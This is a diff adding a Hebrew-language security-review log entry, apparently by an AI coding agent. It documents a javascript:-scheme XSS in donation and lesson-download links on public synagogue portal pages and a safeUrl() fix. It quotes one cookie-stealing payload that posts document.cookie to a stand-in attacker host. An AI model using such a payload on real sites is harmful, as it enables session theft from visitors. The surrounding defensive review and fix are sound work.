@@ -14084,3 +14084,56 @@
     כעת סגורה על כל 9 המערכות בהיקף. נושאים #62/#88/#94/#115/#164/#169/
     #254/#312 נשארים חסומים, ללא שינוי.
     via cloud server 167.99.131.167 [loop B]
+
+507. **המשך לפי הצעת סבב 506: הרצתי את עדשת ה-URL-scheme (href
+    admin-supplied בלי בדיקת סכימה) על 17/21/22/24/27/28.** תוצאה: נקי ב-17
+    (השדה היחיד — `drive_id` — עובר דרך `driveOpenUrl()` שבונה URL קבוע
+    ל-Google Drive, לא URL חופשי), 22 (השדות עם URL מוצגים רק בפאנל אדמין
+    פנימי, לא בעמוד ציבורי), 27 (ה-URL היחיד שנמצא הוא `logoUrl` שמוצג
+    כ-`<img src>` לא `href` — אותו וקטור שתועד ב-506 כלא-אמיתי בדפדפנים
+    מודרניים), 28 (אין שדות URL הניתנים לעריכת אדמין המוצגים לציבור).
+
+    **21-mthbram ו-24-galilee-connect-hub — נמצא ותוקן אותו וקטור בדיוק:**
+    שני האפליקציות חולקות דפוס `donation_link` (21 גם `lesson_download_url`)
+    — שדה טקסט חופשי שאדמין/גבאי מזין בטופס ניהול-פורטל (`PortalSettingsTab`
+    ב-21, `GabaiPortal`/`SynagogueDetailsManager` ב-24), ללא שום ולידציה של
+    תבנית ה-URL בצד השרת, ומוצג כ-`href` בעמודי הפורטל **הציבוריים**
+    (`/public/{publicToken}` ב-21, `/synagogues/{id}` ב-24) וגם בשני
+    קומפוננטות-מודל משותפות (`SynagogueDetailModal`, `LessonDetailModal`
+    ב-21) שנצרכות מעוד כמה עמודים ציבוריים (`LessonDirectory`, `FindLesson`,
+    `SynagogueShowcase`, `FeaturedLessons`, `UpcomingLessonsCarousel`,
+    `PublicOrgPage`/`PublicRabbiPage`). ערך כמו
+    `javascript:fetch('//attacker/'+document.cookie)` עובר ישירות ל-`href`
+    בלי שום סינון — אדמין (או תוקף שפרץ לסשן אדמין) יכול להזריק סקריפט
+    שמתבצע אצל כל מבקר ציבורי שלוחץ על כפתור "תרומה"/"הורדת שיעור".
+
+    **התיקון:** הוספתי `safeUrl()` (regex `^https?:\/\//i`, מחזיר את הערך
+    המקורי רק אם http(s), אחרת `undefined` כדי שה-`&&`-conditional הקיים
+    בכל מוקד פשוט לא ירונדר) ב-`lib/utils.ts` של כל אפליקציה (יש כבר קובץ
+    כזה בשתיהן, עם `cn()`/`getPublicOrigin()` קיימים — לא נוצר קובץ חדש).
+    הוחלפו כל מוקדי הרינדור: 21 — `PublicSynagoguePage.tsx`,
+    `PublicRabbiPage.tsx` (×2 שדות), `SynagogueDetailModal.tsx`,
+    `LessonDetailModal.tsx`, וגם `AdminDashboard.tsx` (תצוגה פנימית
+    read-only — עדיפות נמוכה יותר כי זה פאנל-אדמין-בלבד, אבל תוקן
+    להגנת-עומק בעלות שורה אחת). 24 — `SynagoguePage.tsx`,
+    `SynagogueCarousel.tsx`. `PublicOrgPage.tsx` ב-21 נבדק בנפרד — לא
+    בוחר/מציג `donation_link` כלל (לא ב-`select`), אין מה לתקן שם.
+
+    **בדיקות תקינות:** קריאת קוד בלבד (אין `node_modules`/tsc/dev-server
+    בשתי האפליקציות, כמו בכל סבב קודם). איזון סוגריים בפייתון על כל 9
+    הקבצים ששונו — כולם מאוזנים במדויק (`()`/`{}`/`[]`). `git diff --stat`:
+    9 קבצים, +42/-18. שינוי אדיטיבי בלבד — קישורי http(s) תקינים ממשיכים
+    לעבוד בדיוק כמו קודם, רק ערכי סכימה לא-http(s) מפסיקים לרנדר את
+    הקישור (לא קורסים, לא זורקים שגיאה).
+
+    לא נגעתי במערכות מוגנות 08/09/bkalut-app/bkalot-admin/zr_*/NEDARIM3873/
+    csj/csj_src/igud, ב-`main`, או במערכת מחוץ להיקף. ענף חדש
+    `fix/b-21-24-donation-link-javascript-xss-round507-0824`, נדחף.
+
+    **הבא בתור:** עדשת ה-URL-scheme כעת סגורה בכל 9 המערכות בהיקף
+    (17/18/19/20/21/22/24/27/28 — 23/25 ללא קוד אמיתי). כדאי גם לשקול לסגור
+    את `27-bkalut-price/client/src/pages/financial-crm.tsx:441` שתועד ב-506
+    (עמוד CRM פנימי-לאדמינים, `href={d.url}` בלי בדיקת סכימה — סיכון נמוך
+    אך עדיין פער עקבי). נושאים #62/#88/#94/#115/#164/#169/#254/#312 נשארים
+    חסומים על החלטת משתמש/גישת תשתית, ללא שינוי.
+    via cloud server 167.99.131.167 [loop B]
